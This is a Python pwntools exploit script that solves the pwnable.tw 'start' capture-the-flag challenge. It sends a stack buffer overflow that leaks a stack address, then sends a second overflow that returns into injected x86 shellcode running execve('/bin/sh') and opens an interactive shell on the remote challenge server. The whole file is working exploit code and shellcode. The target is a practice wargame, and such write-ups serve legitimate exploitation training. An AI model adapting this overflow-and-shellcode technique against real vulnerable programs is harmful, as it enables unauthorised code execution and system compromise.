# -*- coding: utf-8 -*-
# @Author: resery
# @Date:   2020-10-22 08:10:47
# @Last Modified by:   resery
# @Last Modified time: 2020-10-22 08:42:35
from pwn import *
from LibcSearcher import LibcSearcher

context.log_level="debug"

if sys.argv[1]=="debug":
	sh = process("./start")
elif sys.argv[1]=="remote":
	sh = remote("chall.pwnable.tw",10000)

elf = ELF("./start")

ru = lambda x:sh.recvuntil(x)
rv = lambda x:sh.recv(x)
ra = lambda x:sh.recvall(x)
sl = lambda x:sh.sendline(x)
sd = lambda x:sh.send(x) 
sla = lambda x,y:sh.sendlineafter(x,y)
lg = lambda x:log.success(x)

def dbg():
	gdb.attach(sh)


ru(":")

payload = "aaaa"*5 + p32(0x08048087)

sd(payload)

stack_addr = u32(rv(4))

lg("[+] stack_addr : \t {}".format(hex(stack_addr)))

shellcode = asm(
	'''
	xor eax,eax
	mov eax,0xb
	xor ecx,ecx
	xor edx,edx
	push 0x68732f
	push 0x6e69622f
	mov ebx,esp
	int 0x80
	''')

payload = "aaaa"*5 + p32(stack_addr+20) + shellcode

sl(payload)

sh.interactive()